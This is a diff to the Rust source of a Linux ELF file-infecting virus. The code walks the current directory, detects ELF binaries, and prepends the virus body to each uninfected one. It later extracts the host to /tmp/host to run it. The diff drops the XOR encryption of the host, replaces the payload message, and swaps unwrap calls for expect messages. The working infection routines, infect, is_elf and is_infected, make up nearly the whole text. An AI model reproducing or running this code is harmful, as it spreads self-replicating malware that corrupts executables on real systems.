@@ -35,18 +35,16 @@ const XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3
 const VIRUS_SIZE: u64 = 2696496;
 
 fn payload() {
-    println!("Rusting is a chemical reaction of iron in the presence of oxygen.
-Common sheet metal rusting in dry air works like this: 4 Fe + 3 O2 --> 2 Fe2O3.
-This reaction is relatively slow and produces a thin coating of stable iron oxide Fe2O3, which is (technically) rust, but is a fairly benign form of rust.")
+    println!("bruh");
 }
 
 fn get_file_size(path: &OsStr) -> u64 {
-    let metadata = fs::metadata(&path).unwrap();
+    let metadata = fs::metadata(&path).expect("Failed to get file size");
     return metadata.len();
 }
 
 fn read_file(path: &OsStr) -> Vec<u8> {
-    let buf = fs::read(path).unwrap();
+    let buf = fs::read(path).expect("Failed to read file from read_file");
     return buf;
 }
 
@@ -59,8 +57,8 @@ fn xor_enc_dec(mut input: Vec<u8>) -> Vec<u8> {
 
 fn is_elf(path: &OsStr) -> bool {
     let mut ident = [0; 4];
-    let mut f = File::open(path).unwrap();
-    f.read(&mut ident).unwrap();
+    let mut f = File::open(path).expect("Failed to open file for ELF testing");
+    f.read(&mut ident).expect("Failed to read from file for ELF testing");
 
     if &ident == ELF_MAGIC {
         // this will work for PIE executables as well
@@ -93,21 +91,20 @@ fn is_infected(path: &OsStr) -> bool {
 }
 
 fn infect(virus: &OsString, target: &OsStr) {
-    let host_buf = read_file(target);
-    let mut encrypted_host_buf = xor_enc_dec(host_buf);
+    let mut host_buf = read_file(target);
     let mut virus_buf = vec![0; VIRUS_SIZE as usize];
-    let mut f = File::open(virus).unwrap();
-    f.read_exact(&mut virus_buf).unwrap();
+    let mut f = File::open(virus).expect("Failed to open file...");
+    f.read_exact(&mut virus_buf).expect("Failed to read from file");
 
-    let mut infected = File::create(target).unwrap();
-    infected.write_all(&mut virus_buf).unwrap();
-    infected.write_all(&mut encrypted_host_buf).unwrap();
-    infected.sync_all().unwrap();
-    infected.flush().unwrap();
+    let mut infected = File::create(target).expect("Failed to create infected file");
+    infected.write_all(&mut virus_buf).expect("Failed to write virus to infected file");
+    infected.write_all(&mut host_buf).expect("Failed to write host to infected file");
+    infected.sync_all().expect("Failed to sync infected file");
+    infected.flush().expect("Failed to flush infected file");
 }
 
 fn run_infected_host(path: &OsString) {
-    let mut encrypted_host_buf = Vec::new();
+    let mut host_buf = Vec::new();
     let mut infected = File::open(path).unwrap();
 
     let plain_host_path = "/tmp/host";
@@ -118,11 +115,10 @@ fn run_infected_host(path: &OsString) {
         .open(plain_host_path)
         .unwrap();
     infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();
-    infected.read_to_end(&mut encrypted_host_buf).unwrap();
+    infected.read_to_end(&mut host_buf).unwrap();
     drop(infected);
 
-    let mut decrypted_host_buf = xor_enc_dec(encrypted_host_buf);
-    plain_host.write_all(&mut decrypted_host_buf).unwrap();
+    plain_host.write_all(&mut host_buf).unwrap();
     plain_host.sync_all().unwrap();
     plain_host.flush().unwrap();
 
@@ -135,14 +131,14 @@ fn main() {
     let args: Vec<String> = env::args().collect();
     let myself = OsString::from(&args[0]);
 
-    let current_dir = env::current_dir().unwrap();
-    for entry in fs::read_dir(current_dir).unwrap() {
+    let current_dir = env::current_dir().expect("Failed to get home dir");
+    for entry in fs::read_dir(current_dir).expect("Failed to read home dir") {
         let entry = entry.unwrap();
         let path = entry.path();
 
-        let metadata = fs::metadata(&path).unwrap();
+        let metadata = fs::metadata(&path).expect("Failed to get metadata from path");
         if metadata.is_file() {
-            let entry_name = path.file_name().unwrap();
+            let entry_name = path.file_name().expect("Failed to get file name from path");
             if myself == entry_name {
                 continue;
             }
